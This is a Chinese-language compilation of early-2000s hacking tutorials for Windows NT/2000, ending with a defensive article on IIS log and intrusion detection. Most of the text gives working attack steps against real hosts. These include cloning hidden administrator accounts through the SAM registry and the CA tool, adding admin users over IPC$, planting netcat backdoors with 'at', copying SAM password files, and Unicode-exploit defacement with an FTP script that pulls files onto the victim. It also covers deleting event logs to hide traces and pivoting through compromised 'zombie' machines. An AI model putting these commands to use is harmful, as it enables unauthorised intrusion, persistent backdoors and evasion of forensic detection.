“将adam.reg文件的第三行--[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4]最后的"1F4"修改为IUSR_MachineName的SID” 

 

现在，你还要从iusr.reg文件中复制一下内容 

就是将iusr.reg文件中“"V"=hex:0”开始一直到iusr.reg文件结束部分复制下来 

然后替换掉adam.reg中同样位置的部分 

 

最后使用 
regedit /s adam.reg 

导入该Reg文件 

 

呵呵，别忘了给这个IUSR_MachineName改密码哦。 

 

hehe,ok，大功告成。 

 

现在IUSR_MachineName账号拥有了管理员的权限，但是你使用net.exe和管理工具中的用户管理都将看不到任何痕迹，即使你去察看所属于的组和用户。 都和修改前没有任何区别。 

 

2...利用 CA.exe: http://www.heibai.net/download/show.php?id=2360 

利用SA.exe 将Iusr_victim克隆为Administrator。 


C:\>ca \\192.168.0.1 test test iusr_victim password 
Clone Administrator, by netXeyes 2002/04/06 
Written by netXeyes 2002, dansnow@21cn.com 

Connect 192.168.0.1 ....OK 
Get SID of iusr_victim ....OK 
Prepairing ....OK 
Processing ....OK 
Clean Up ....OK 
 

这时，iusr_victim就成为了超级用户，并有具有和Administrator同样的设置(桌面、菜单等等）。 


------------------------------------------------------- 

用CCA.EXE检查是否存在克隆的帐号。 

不必改变ACL, 支持远程检查。 


C:\>cca \\192.168.0.29 administrator 123456 
Check Clone Account, by netXeyes 2002/04/29 
Written by netXeyes 2002, dansnow@21cn.com 

Connect 192.168.0.29 ....OK 
Prepairing ....OK 
Processing ....OK 
Checking .... 

Check Result: 

[DuDu] AS SAME AS [administrator] 
[Guest] AS SAME AS [administrator] 
[IUSR_RONG] AS SAME AS [administrator] 
[IWAM_RONG] AS SAME AS [administrator] 
[TEST] AS SAME AS [administrator] 
[xr] AS SAME AS [administrator] 
[Guest] AS SAME AS [DuDu] 
[IUSR_RONG] AS SAME AS [DuDu] 
 

这上面的DuDu，guest，IUSR_RONG等帐户就已经是被克隆为administrator啦 



【克隆帐号常见问题和解答】
常见问题和回答： 
1，使用ca时，出现connect **.**.**.** ...Error是怎么会事？ 
答：ca和cca需要目标开放ipc$，请确认可以与目标建立ipc$。参见“关于ipc$和空连接” 
2，使用ca时，出现“Processing....ERROR”是怎么会事？ 
答：这说明对方主机缺少文件msvcp60.dll，想办法传个过去放在系统目录下就可以了。 
3，克隆过程没有错误，但cca没有显示该帐号克隆成功，无法使用被克隆的帐号。 
答：这一般是因为对方主机是域控制器，注册表中sam结构不同，工具失效。暂时无法解决。 
4，手动克隆无法访问注册表SAM键怎么办？ 
答：在命令行方式，可以使用psu工具获得SYSTEM权限，从而访问SAM键。详见上面说明。 
在图形界面，运行regedt32.exe，找到SAM键并选中。“安全”子菜单栏里有一项“权限”，打开它。在里面设 

置administrator和SYSTEM一样有完全控制权限。关闭regedt32再打开，就可以访问SAM键了。 



【入侵命令详解】
入侵命令详解 
-------------------------------------------------------------------------------- 
1：NET 
只要你拥有某IP的用户名和密码，那就用IPC$做连接吧！ 
这里我们假如你得到的用户是hbx，密码是123456。假设对方IP为127.0.0.1 
net use \\127.0.0.1\ipc$ 123456 /user:hbx null密码为空 
退出的命令是 
net use \\127.0.0.1\ipc$ /delete 
-------------------------------- 
net share是查看主机共享资源我们用它建一个秘密共享目录吧net share me=c:\winnt\system32 这样这个机器就有了一个名为me的共享目录，而打开它就是winnt下的system32目录，如果你用win2000的系统就知这个目录有多重要了，如果不想要也好办net share me /delete 呵呵，没有了，是不是很方便的啊。 
---------------------- ---------------------- ---------------------- 
下面的操作你必须登陆后才可以用.登陆的方法就在上面. 
---------------------- ---------------------- ---------------------- 
下面我们讲怎么创建一个用户，由于SA的权限相当于系统的超级用户. 
我们加一个heibai的用户密码为lovechina 
net user heibai lovechina /add 
只要显示命令成功，那么我们可以把他加入Administrator组了. 
net localgroup Administrators heibai /add 
---------------------- 
这里是讲映射对方的C盘，当然其他盘也可以，只要存在就行了.我们这里把对方的C盘映射到本地的Z盘. 
net use z:\\127.0.0.1\c$ 
---------------------- 
net start telnet 
这样可以打开对方的TELNET服务. 
---------------------- 
这里是将Guest用户激活，guest是NT的默认用户，而且无法删除呢？不知道是否这样，我的2000就是删除不了它。 
net user guest /active:yes 
---------------------- 
net user guest /active:no这样这个guest的用户就又被禁用了 
---------------------- 
这里是把一个用户的密码改掉，我们把guest的密码改为lovechina，其他用户也可以的。只要有权限就行了呀！ 
net user guest lovechina 
有人问到提高权限的问题 下面就解决下 
net localgroup administrators guest /add 
将guest变为administrator 
net命令果然强大啊！ net view命令看对方开了共享 
------------------------------------------------------------------------------------------------------------- 
net user是查看所有用户列表，看看哪个用户是和你一样偷跑进来的，给他名给删掉，让他美，net user 用户名 /delete哈哈,他没有了,管他什么是不是管理员呢,不过我们还是查一下管理员组有什么用户吧,这样的用户才对我们有用嘛 net localgroup administrators就列出管理员组成员了,再查看一下administrator这个用户，因为这个是创建系统时建出来的，所以要看看他的系统是什么时间创建出来的 
net user administrator，然后再查看别的管理员用户是什么时间创建的，如果相差太远，那可能是被别人偷偷跑来偷建的，一律del，安全第一哦................ 
---------------------------------------------------------------------------------------------------------------------- 
2:at 
一般一个入侵者入侵后都会留下后门，也就是种木马了，你把木马传了上去，怎么启动他呢？ 
那么需要用AT命令，这里假设你已经登陆了那个服务器。 
---------------------- 
你首先要得到对方的时间， 
net time \\127.0.0.1 
---------------------- 
将会返回一个时间，这里假设时间为12:1，现在需要新建一个作业，其ID=1 
at \\127.0.0.1 12:3 nc.exe 
这里假设了一个木马，名为NC.EXE，这个东西要在对方服务器上. 
这里介绍一下NC，NC是NETCAT的简称，为了方便输入，一般会被改名.它是一个TELNET服务，端口为99. 
等到了12:3就可以连接到对方的99端口.这样就给对方种下了木马. 
----------------------------------------------------- 
at命令功能强大,下面可以打个比方: 
C:\> AT 22:30 Start C:\prettyboy.mp3 
新加了一项作业，其作业 ID = 1 [现在我们新建立了一个任务 在22:30分 系统将自动播放歌曲] 
---------------------------------------------------------------------------------------------------------------------- 
3:telnet 
这个命令非常实用，它可以与远方做连接，不过正常下需要密码、用户，不过你给对方种了木马，直接连到这个木马打开的端口. 
telnet 127.0.0.1 99 
这样就可以连到对方的99端口.那你就可以在对方运行命令了，这个也就是肉鸡. 
---------------------------------------------------------------------------------------------------------------------- 
4:FTP 
它可以将你的东西传到对方机子上，你可以去申请个支持FTP上传的空间，国内多的是，如果真的找不到，我http://www.51.net/，不错的.当我们申请完后，...以及FTP服务器. 
在上传前需要登陆先，这里我们假设FTP服务http://www.51.net/，用户名是HUCJS，密码是654321 
ftp http://www.51.net/ 
他会要求输入用户，成功后会要求输入密码. 
---------------------- 
下面先说上传，假设你需上传的文件是INDEX.HTM，它位于C:\下，传到对方D:\ 
get c:\index.htm d:\ 
假设你要把对方C盘下的INDEX.HTM，下到你的机子的D盘下 
put c:\index.htm d:\ 
-------------------------------------------------- 
这里的问题是两个命令的解释正好弄反了，登陆ＦＴＰ服务器后get才是下载，而put命令是上传，这和tftp的命令正好相反，在tftp命令里get是上传put是下载，这下明白了吧，而且在ＦＴＰ服务器中不能用c:\和d:\这样来指明路径，这也是在tftp里面用的方法，FTP可不会执行的，不信你去试好了，正确应该这样上传文件put index.htm这样就足够了，装c盘根目录下的index.htm文件上传到FTP服务器的当前目录下，不喜欢就del index.htm删掉这文件，下载时先查看一下目录，dir然后看这个目录里有什么，有你要的你就get index.htm这样就把index.htm这个文件下载到你自己的c盘根目录下了。 
-------------------------------------------------------------- 
get index.htm c:\inetpub\wwwroot\index.htm（这里是把你空间上的index.htm下载到对方的c:\inetpub\wwwroot\index.htm）" 
这句的解释里就没有出现错误，呵呵，看来那以前的还是马虎所至吧 
好了，总算找出错处了吧，再说下面吧。 
---------------------------------------------------------------------------------------------------------------------- 
5:copy 
下面我说说怎样把本地的文件复制到对方硬盘上去， 需要建立好IPC$连接才有效。 
这里我们把本地C盘下的index.htm复制到127.0.0.1的C盘下 
copy index.htm \\127.0.0.1\c$\index.htm 
---------------------- 
如果你要复制到D盘下 把C改为D， 就行了！ 
copy index.htm \\127.0.0.1\d$\index.htm 
---------------------- 
如果你要把他复制到 WINNT 目录里 
就要把输入 
copy index.htm \\127.0.0.1\admin$\index.htm 
admin$是winnt 
--------------------- 
要把对方的文件复制过来，顺便告诉大家 NT的备份的数据库放在x:\winnt\repair\sam._ sam._是数据库的文件名 
---------------------- ---------------------- 
下面就把127.0.0.1的数据库复制到本地C盘下 
copy \\127.0.0.1\admin$\repair\sam._ c:\ 
这个sam._这明显是NT主机的口令档，如果是win2000机器的口令文件应该是sam 
---------------------------------------------------------------------------------------------------------------------- 
6：set 
如果你跑进了一部机子，而且想黑他（这思想只能在特别时候才准有），当然他的80端口要开，不然你黑给谁看。这时需要用SET命令！ 
下面是我得到的结果！我来分析它，只是找主页在那而已。 
COMPUTERNAME=PENTIUMII 
ComSpec=D:\WINNT\system32\cmd.exe 
CONTENT_LENGTH=0 
GATEWAY_INTERFACE=CGI/1.1 
HTTP_ACCEPT=*/* 
HTTP_ACCEPT_LANGUAGE=zh-cn 
HTTP_CONNECTION=Keep-Alive 
HTTP_HOST=当前登陆者的IP，这里本来是显示我的IP，被我删除了 
HTTP_ACCEPT_ENCODING=gzip， deflate 
HTTP_USER_AGENT=Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt) 
NUMBER_OF_PROCESSORS=1 
Os2LibPath=D:\WINNT\system32\os2\dll; 
OS=Windows_NT 
Path=D:\WINNT\system32;D:\WINNT 
PATHEXT=.COM;.EXE;.BAT;.CMD 
PATH_TRANSLATED=E:\vlroot主页放在的地址，只要你看到PATH_TRANSLATED=的后面就是主页的存放地址。这里是E:\vlroot 
PROCESSOR_ARCHITECTURE=x86 
PROCESSOR_IDENTIFIER=x86 Family 6 Model 3 Stepping 3， GenuineIntel 
PROCESSOR_LEVEL=6 
PROCESSOR_REVISION=0303 
PROMPT=$P$G 
QUERY_STRING=/c+set 
REMOTE_ADDR=XX.XX.XX.XX 
REMOTE_HOST=XX.XX.XX.XX 
REQUEST_METHOD=GET 
script_NAME=/scripts/..%2f../winnt/system32/cmd.exe 
SERVER_NAME=XX.XX.XX.XX 
SERVER_PORT=80 
SERVER_PORT_SECURE=0 
SERVER_PROTOCOL=HTTP/1.1 
SERVER_SOFTWARE=Microsoft-IIS/3.0对方使用IIS/3.0 
SystemDrive=D: 
SystemRoot=D:\WINNT 
TZ=GMT-9 
USERPROFILE=D:\WINNT\Profiles\Default User 
windir=D:\WINNT 
粉红色的那行就是对方主页存放地址，这里告诉大家一个技巧，很笨的技巧啊，不过只能用这个方法才能100%的找到主页的名称，当你DIR这个目录时，一定会看到很多文件，你可以把所有文件在浏览器这样输入XX.XX.XX.XX/文件名，这样只要看到和XX.XX.XX.XX看到的也面一模一样，那么这就是主页的名称了。 
---------------------------------------------------------------------------------------------------------------------- 
7：nbtstat 
如果你扫到一部NT的机子，他的136到139其中一个端口开了的话，就要用这个命令得到用户了。顺便告诉大家这是netbios，得到用户名后就可以猜猜密码了。例如比较简单的密码，密码和用户名一样的，都试下，不行就暴力破解吧！ 
现在网上很多NT的机子都开了这些端口的，你可以练习下，我们来分析得到的结果。 
命令是 
nbtstat -A XX.XX.XX.XX 
-A一定要大写哦。 
这个我认为大不大写没有太大差别，用处还是一样的。 
之后用net use \\对方IP 连接一下！ 
net view \\对方IP 查看对方共享文件夹 
net use X: \\IP\对方共享文件 映射对方共享文件夹成为本机的X盘 
这就是139端口的基本用法！不过前提是必须对方开共享！ 
netstat -n看看谁连接你 
----------------- 
下面是得到的结果。 
NetBIOS Remote Machine Name Table 
Name Type Status 
--------------------------------------------- 
Registered Registered Registered Registered Registered Registered Registered Reg 
istered Registered Registered Registered 
MAC Address = 00-E0-29-14-35-BA 
PENTIUMII <00> UNIQUE 
PENTIUMII <20> UNIQUE 
ORAHOTOWN <00> GROUP 
ORAHOTOWN <1C> GROUP 
ORAHOTOWN <1B> UNIQUE 
PENTIUMII <03> UNIQUE 
INet~Services <1C> GROUP 
IS~PENTIUMII...<00> UNIQUE 
ORAHOTOWN <1E> GROUP 
ORAHOTOWN <1D> UNIQUE 
..__MSBROWSE__.<01> GROUP 
粉红色的就是登陆过这部系统的用户，可能你不知道怎么看，大家是不是看到了一窜数字，只要这窜数字是 <03> 的话，那他前面的就是用户. 这里的用户是PENTIUMII。 
没有03说明:MAC没和IP捆在一起了 
---------------------------------------------------------------------------------------------------------------------- 
8：Shutdown 
关了对方的NT服务器的命令 
Shutdown \\IP地址 t:20 
20秒后将NT自动关闭，三思后才能运行这个命令，这样对对方造很大的损失，要做个有良心的入侵者呀。 
Telnet进去用命令或者是本地用什么软件重启对方电脑 
shutdown -m \\计算机名称 可以远程重起或关闭的 
-------------------------------------------------------------------------------- 
9：DIR 
这个命令没什么好讲，但是却非常重要，他是查看一目录里的所有文件、文件夹。 
你可以本地试下。 
-------------------------------------------------------------------------------- 
10：echo 
著名的漏洞Unicode，这个命令可以简单的黑一下有这个漏洞的主机。 
我们假设我们要把“南京大屠杀铁证如山，任何日本人不得抵赖！”写入index.htm，有2种方法，大家看看有什么区别。 
------------------------------------------------------- 
echo 南京大屠杀铁证如山，任何日本人不得抵赖！>index.htm 
echo 南京大屠杀铁证如山，任何日本人不得抵赖！>>index.htm 
------------------------------------------------------- 
第一个的意思是覆盖index.htm原有的内容，把“南京大屠杀铁证如山，任何日本人不得抵赖！”写进index.htm。 
第二个的意思是把“南京大屠杀铁证如山，任何日本人不得抵赖！”加到index.htm里面。 
------------------------------------------------------- 
“>>”产生的内容将追加进文件中，“>”则将原文件内容覆盖。 
这里说明一下，<和>是重定向命令只是一个是输入重定向另一个是输出重定向，比如我们在命令提示符下就会显示c:\>这个意思就是把C盘的命令权重定向给我们，同样：也是定向的命令也叫作管道，它是用来连接两个命令的管道，先执行管道左边的命令，再执行管道右边的命令，不过我是没能耐把DOS命令说明白的，想研究就买本dos大全看吧，够看半年的了。 
------------------------------------------------------- 
大家可以本地试下。 
可能你会问，这样简单黑下有什么好玩的，其实他可以用来下载主页到对方的目录里。 
1、首先，我们需要申请一个免费的主页空间。 
2、用echo在可写目录下建立如下内容的txt文件：（以chinren服务器为例。） 
open upload.chinaren.com（你的FTP服务器，申请时你的空间提供商会给你的） 
cnhack（你申请时的用户名） 
test（你申请时的密码） 
get index.htm c:\inetpub\wwwroot\index.htm（这里是把你空间上的index.htm下载到对方的c:\inetpub\wwwroot\index.htm） 
bye（退出FTP对话，相当在98下的DOS，用EXIT退出DOS） 
--------------------------------------------- 
具体的做法： 
输入 echo open upload.chinaren.com> c:\cnhack.txt 
输入 echo cnhack >> c:\cnhack.txt 
输入 echo 39abs >> c:\cnhack.txt 
输入 echo get index.htm c:\inetpub\wwwroot\index.htm+>>+c:\cnhack.txt 
最后输入 ftp -s:c:\cnhack.txt （利用ftp的-s参数，执行文件里的内容。） 
等命令完成时，文件已经下载到你指定的文件里了。 
----------------------- 
注意：取得文件后，请删除cnhack.txt。（如果不删除，很容易会给别人看到你的密码。） 
记得要 del c:\cnhack.txt 
-------------------------------------------------------------------------------- 
11:attrib 
这个命令是设置文件属性的。如果你想黑一个站，而他的主页的文件属性设置了只读，那就很可怜呀，想删除他也不行，想覆盖他也不行。倒！不过有这个命令就别怕了。 
attrib -r index.htm 
这个命令是把index.htm的只读属性去掉。 
如果把“-”改为“+”则是把这个文件的属性设置为只读 
---------------------- 
attrib +r index.htm 
这个命令是把index.htm的属性设置为只读。 
---------------------------------------- 
attrib这个命令先要用来查属性，比如attrib 文件名，这样就显示出这个文件的属性了，它不止有R这个属性，其实一共有四种属性， a 档案属性 r 只读属性 h隐含属性 s系统属性，我们想用哪个就用哪个，我觉得把我们上传的文件加个隐含属性更有意思，，，，，继续挑那贴的错. 
---------------------------------------------------------------------------------------------------------------------- 
12:del 
当你看到这个标题可别倒下啊！现在要离开127.0.0.1了，要删除日志，当然要删除日志啦！想被捉吗。呵呵。 
NT的日志有这些 
del C:\winnt\system32\logfiles\*.* 
del C:\winnt\ssytem32\config\*.evt 
del C:\winnt\system32\dtclog\*.* 
del C:\winnt\system32\*.log 
del C:\winnt\system32\*.txt 
del C:\winnt\*.txt 
del C:\winnt\*.log 
只要删除这些就可以了。有些系统NT安装在D盘或其他盘，就要把C改成其他盘。 
Internet信息服务FTP日志默认位置：%systemroot%\system32\logfiles\msftpsvc1\，默认每天一个日志 
Internet信息服务WWW日志默认位置：%systemroot%\system32\logfiles\w3svc1\，默认每天一个日志 
Scheduler服务日志默认位置：%systemroot%\schedlgu.txt 
以上日志在注册表里的键： 
应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的： 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Eventlog 
有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。 
Schedluler服务日志在注册表中 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent 
-------------------------------------------------------------------- 
del确实是删除文件用的，log也确实是日志文件类型，不过按上面这种方法是不可能清理掉你自身的日志的，因为系统自动运行着日志记录，你在做这些时它一直都在记录着，并没有停止，大家也会常看到，有时删除某个文件时会提示系统正在占用拒绝删除的，呵呵，这就明白了，系统正在运行的东西已经驻留内存里，当然不能这样删除掉了，大家怕了吧，这样删等于帮别人清理了日志，没删自己那份啊，哈哈哈哈，要问我怎么清理，我只说大家还是用小榕的工具来清吧，那个又快又好，我们何必去用那些烦琐的命令行呢，尤其对生长在windows桌面操作下的人们那显然是太麻烦了，我推荐小榕的elsave工具，清理日志又快又干净，还省电呢，嘻嘻，我可不是做广告来的。 
------------------------------------------------------------------------- 
借助第三方工具：如小榕的elsave.exe远程清除system,applicaton,security的软件， 
使用方法很简单，首先利用获得的管理员账号与对方建立ipc会话，net use \\ip pass /us 
er: user 
然后命令行下：elsave -s \\ip -l application -C，这样就删除了安全日志。 
其实利用这个软件还可以进行备份日志，只要加一个参数 -f filename就可以了，在此不再详述。 
--------------------------------------------------------------------------------局域网要别人死机? 他C盘开了共享的话(win98,而且没有打补丁),你在DOS下输入 
\\他的IP或机器名\c\con\con http://www.acnow

【入侵时隐藏自己的真正身份 】
入侵时隐藏自己的真正身份 

作者：Meteor

在入侵中，很多时侯会使用telent来登陆的，但是如果服务器启动telnet服务的话，登
陆就会被记录下来，虽然可以有程序可以清除那些记录，但是一定是要有admin权限才可
以的，如果你第一次入侵时都是通过猜密码的话，而且入侵不成功或成功后亦得不到adm
in权限的话，那就清不掉那些记录了。以后是简单说说几种可以隐藏自己身份的方法： 

1.使用socks代理，视窗下自带的telnet程序是不支持socks代理的，想使作socks代理就
要通过其它程序，例如sockcap32,e-border client等等，其它的telnet客户程序，例如
netterm是直接支持socks代理的，但是你是没法知道那个代理服务器是否会主录下你的
要求的，如果是一个恶意的代理的话，会从记录中得到你输入的用户名和密码的，而且
有记录的话，亦不算得上是安全的。wingate亦可以当成是跳板的，不过不是很方便。

2.在肉鸡上建立跳板，这种方法是比较安全的。传统方法是在肉鸡上增加一个admin权限
的帐户，然后启动telnet服务，在入侵时先telnet上这台肉鸡，再通过网鸡telnet上要
入侵的服务器，完成入侵后就将肉鸡上的telnet日志清掉。

现在流行的还有其它的几种方法，一般都是在肉鸡上执行一个shell程序，这个程序被执
行后就在肉鸡上打开一个端口让你telnet上去，这种方法好处是不用清日志，除非是防
火墙记录下你的连接，不然是不会被发现的。这些程序常见的有nc(全名netcat),ncx99(
每使用一次都是执行一次)，icmd(可自定义端口和密码，推荐)，Drat(这是木马，而且
很难清掉，将代码插入shell进程上,不建议使用),tini(非常小的木马，只有3K,不过可
被查杀，不是很安全)，winshell(国产程序，不过不能在中文的NT或2000中执行，程序7
K大小，不过因为不能在中文视窗中使用，我不是很喜欢),leapfrog(算是旧程序,压缩后
有40多K,可以自定义端口,而且可以限制那个段的IP可以允许连接，例如你的IP是61.127
.189.89的话，一般来说，前三位的IP都不会变化的，你可以设置允许连接的IP段是61.1
27.189.*，这样只有符合这个段的IP才可以连接上，我最喜欢的还是它可以在所有的win
dows上执行，而上面的几种程序除了木马和nc外，winshell,icmd,ncx99都不能在win95
或98上执行的,但现在使用win98的用户还是远远在使用2000或NT的用户上的),snake代理
跳板(国人开发的sock服务器端程序，在肉鸡上执行，但一定要有admin的权限才可以启
动的，只可以在2000或NT下执行，而且中文的视窗是不可以使用的)。

总结：使用socks代理或wingate不算是十分安全，在肉鸡上使用telnet服务亦算是安全
的(你要记得清日志)，不过很多服务器都不会打开telnet服务的。使用一些shell程序或
木马是十分方便和安全的。在那些shell程序和木马中,winshell和snake代理跳板亦算是
不错的，但很不幸就是有限制(国人开发的程序都是很有限制的),ncx99,icmd,nc是个不
错的选择，nc还有很多功能的,至于那两个木马，drat就太危险了，可以会导致那台肉鸡
不可以正常运行的，tini就不会在自启动中加载。leapfrog虽然比winshell或snake等大
，但还是值得试试的，而且leapfrog可能饶过防火墙，因为很多防火墙只限制了某些端
口可以使用的，上述的那些程序使如winshell,snake,icmd和nc都可以自定义端口，但是
如果防火墙只允许80端口的话，上述程序如果将自己绑在80端口的话，因为服务器打开
了80端口一般是有www服务的，如果你再将上述的程序绑入80端口的话，一定会产生错误
的，但leapfrog就没有这个问题的。 



【入侵检测】
入侵检测初步
 
[Shotgun] / [2001年 15期] 

--------------------------------------------------------------------------------
前面几期报纸介绍了Win2000 Server的安全配置，经过精心配置的Win2000服务器可以防御90%以上的入侵和渗透，但是，就象上一章结束时所提到的：系统安全是一个连续的过程，随着新漏洞的出现和服务器应用的变化，系统的安全状况也在不断变化着；同时由于攻防是矛盾的统一体，道消魔长和魔消道长也在不断的转换中，因此，再高明的系统管理员也不能保证一台正在提供服务的服务器长时间绝对不被入侵。
　　 所以，安全配置服务器并不是安全工作的结束，相反却是漫长乏味的安全工作的开始，本文我们将初步探讨Win2000服务器入侵检测的初步技巧，希望能帮助您长期维护服务器的安全。
　　 入侵的检测主要还是根据应用来进行，提供了相应的服务就应该有相应的检测分析系统来进行保护，对于一般的主机来说，主要应该注意以下几个方面：
　　 1.基于80端口入侵的检测
　　 WWW服务大概是最常见的服务之一了，而且由于这个服务面对广大用户，服务的流量和复杂度都很高，所以针对这个服务的漏洞和入侵技巧也最多。对于NT来说，IIS一直是系统管理员比较头疼的一部分，不过好在IIS自带的日志功能从某种程度上可以成为入侵检测的得力帮手。IIS自带的日志文件默认存放在System32/LogFiles目录下，一般是按24小时滚动的，在IIS管理器中可以对它进行详细的配置。
　　 我们假设一台WEB服务器，开放了WWW服务，你是这台服务器的系统管理员，已经小心地配置了IIS，使用W3C扩展的日志格式，并至少记录了时间（Time）、客户端IP（Client IP）、方法（Method）、URI资源（URI Stem）、URI查询（URI Query），协议状态（Protocol Status），我们用最近比较流行的Unicode漏洞来进行分析：打开IE的窗口，在地址栏输入：127.0.0.1/scripts/..%c1% 1c../winnt/system32/cmd.exe?/c+dir默认的情况下你可以看到目录列表，让我们来看看IIS的日志都记录了些什么，打开Ex010318.log（Ex代表W3C扩展格式，后面的一串数字代表日志的记录日期）：07:42:58 127.0.0.1 GET /scripts/..\../winnt/system32\cmd.exe /c+dir 200上面这行日志表示在格林威治时间07:42:58（就是北京时间23:42:58），有一个家伙（入侵者）从127.0.0.1的IP在你的机器上利用Unicode漏洞（%c1%1c被解码为“\”，实际的情况会因为Windows版本的不同而有略微的差别）运行了cmd.exe，参数是/c dir，运行结果成功（HTTP 200代表正确返回）。
　　 大多数情况下，IIS的日志会忠实地记录它接收到的任何请求（也有特殊的不被IIS记录的攻击，这个我们以后再讨论）。但是，IIS的日志动辄数十兆、流量大的网站甚至数十G，人工检查几乎没有可能，唯一的选择就是使用日志分析软件，用任何语言编写一个日志分析软件（其实就是文本过滤器）都非常简单。
　　 告诉大家一个简单的方法，比方说你想知道有没有人从80端口上试图取得你的Global.asa文件，可以使用以下的命令：find “Global.asa” ex010318.log /i。这个命令使用的是NT自带的find.exe工具，可以轻松的从文本文件中找到你想过滤的字符串，“Global.asa”是需要查询的字符串，ex010318.log是待过滤的文本文件，/i代表忽略大小写。因为我无意把这篇文章写成微软的Help文档，所以关于这个命令的其他参数以及它的增强版FindStr.exe的用法请去查看Win2000的帮助文件。
　　 无论是基于日志分析软件或者是Find命令，你都可以建立一张敏感字符串列表，包含已有的IIS漏洞（比如“+.htr”）以及未来将要出现的漏洞可能会调用的资源（比如Global.asa或者cmd.exe），通过过滤这张不断更新的字符串表，一定可以尽早了解入侵者的行动。
　　 需要提醒的是，使用任何日志分析软件都会占用一定的系统资源，因此，对于IIS日志分析这样低优先级的任务，放在夜里空闲时自动执行会比较合适，如果再写一段脚本把过滤后的可疑文本发送给系统管理员，那就更加完美了。同时，如果敏感字符串表较大，过滤策略复杂，我建议还是用C写一个专用程序会比较合算。
　　 2.基于安全日志的检测
　　 通过基于IIS日志的入侵监测，我们能提前知道窥伺者的行踪（如果你处理失当，窥伺者随时会变成入侵者），但是IIS日志不是万能的，它在某种情况下甚至不能记录来自80端口的入侵，根据我对IIS日志系统的分析，IIS只有在一个请求完成后才会写入日志，换言之，如果一个请求中途失败，日志文件中是不会有它的踪影的（这里的中途失败并不是指发生HTTP400错误这样的情况，而是从TCP层上没有完成HTTP请求，例如在POST大量数据时异常中断），对于入侵者来说，就有可能绕过日志系统完成大量的活动。
　　 而且，对于非80 Only的主机，入侵者也可以从其它的服务进入服务器，因此，建立一套完整的安全监测系统是非常必要的。
　　 Win2000自带了相当强大的安全日志系统，从用户登录到特权的使用都有非常详细的记录，可惜的是，默认安装下安全审核是关闭的，以至于一些主机被黑后根本没法追踪入侵者。所以，我们要做的第一步是在管理工具-本地安全策略-本地策略-审核策略中打开必要的审核，一般来说，登录事件与账户管理是我们最关心的事件，同时打开成功和失败审核非常必要，其他的审核也要打开失败审核，这样可以使得入侵者步步维艰，一不小心就会露出马脚。仅仅打开安全审核并没有完全解决问题，如果没有很好的配置安全日志的大小及覆盖方式，一个老练的入侵者就能够通过洪水般的伪造入侵请求覆盖掉他真正的行踪。通常情况下，将安全日志的大小指定为50MB并且只允许覆盖7天前的日志可以避免上述情况的出现。
　　 除了安全日志，系统日志和应用程序日志也是非常好的辅助监测工具，一般来说，入侵者除了在安全日志中留下痕迹（如果他拿到了Admin权限，那么他一定会去清除痕迹的），在系统和应用程序日志中也会留下蛛丝马迹，作为系统管理员，要有不放过任何异常的态度，这样入侵者就很难隐藏他们的行踪。
　　3.文件访问日志与关键文件保护
　　除了系统默认的安全审核外，对于关键的文件，我们还要加设文件访问日志，记录对它们的访问。
　　文件访问有很多的选项：访问、修改、执行、新建、属性更改……一般来说，关注访问和修改就能起到很大的监视作用。
　　例如，如果我们监视了系统目录的修改、创建，甚至部分重要文件的访问（例如cmd.exe，net.exe，system32目录），那么，入侵者就很难在不引起我们注意的情况下安放后门。要注意的是，监视的关键文件和项目不能太多，否则不仅增加系统负担，还会扰乱日常的日志监测工作。关键文件不仅仅指的是系统文件，还包括有可能对系统管理员和其他用户构成危害的任何文件，例如系统管理员的配置、桌面文件等等，这些都是有可能被用来窃取系统管理员资料和密码的。
　　4.进程监控
　　进程监控技术是追踪木马后门的另一个有力武器，90%以上的木马和后门是以进程的形式存在的。作为系统管理员，了解服务器上运行的每个进程是职责之一（否则不要说安全，连系统优化都没有办法做）。做一份每台服务器运行进程的列表非常必要，能帮助管理员一眼就发现入侵进程，异常的用户进程或者异常的资源占用都有可能是非法进程。除了进程外，dll也是危险的东西，例如把原本是exe类型的木马改写为dll后，使用rundll32运行就比较具有迷惑性。
　　5.注册表校验
　　一般来说，木马或者后门都会利用注册表来再次运行自己，所以，校验注册表来发现入侵也是常用的手法之一。一般来说，如果一个入侵者只懂得使用流行的木马，那么由于普通木马只能写入特定的几个键值（比如Run、Runonce等等），查找起来是相对容易的，但是对于可以自己编写或改写木马的人来说，注册表的任何地方都可以藏身，靠手工查找就没有可能了。应对的方法是监控注册表的任何改动，这样改写注册表的木马就没有办法遁形了。监控注册表的软件非常多，很多追查木马的软件都带有这样的功能，一个监控软件加上定期对注册表进行备份，万一注册表被非授权修改，系统管理员也能在最短的时间内恢复。
　　6.端口监控
　　虽然说不使用端口的木马已经出现，但是大部分的后门和木马还是使用TCP连接的，监控端口的状况对于由于种种原因不能封锁端口的主机来说就是非常重要的了。对于系统管理员来说，了解自己服务器上开放的端口甚至比对进程的监控更加重要，常常使用netstat查看服务器的端口状况是一个良好的习惯，但是并不能24小时这样做，而且NT的安全日志有一个缺陷，喜欢记录机器名而不是IP，如果你既没有防火墙又没有入侵检测软件，倒是可以用脚本来进行IP日志记录的，看着这个命令：netstat -n -p tcp 10>>Netstat.log，这个命令每10秒钟自动查看一次TCP的连接状况，基于这个命令我们做一个Netlog.bat文件：time /t>>Netstat.log Netstat -n -p tcp 10>>Netstat.log。这个脚本将会自动记录时间和TCP连接状态，需要注意的是：如果网站访问量比较大，这样的操作是需要消耗一定的CPU时间的，而且日志文件将越来越大，所以请慎之又慎。
　　一旦发现异常的端口，可以使用特殊的程序来关联端口、可执行文件和进程（如inzider就有这样的功能，它可以发现服务器监听的端口并找出与该端口关联的文件，inzider可以从http://www.nttoolbox.com下载），这样无论是使用TCP还是UDP的木马都无处藏身。
　　7.终端服务的日志监控
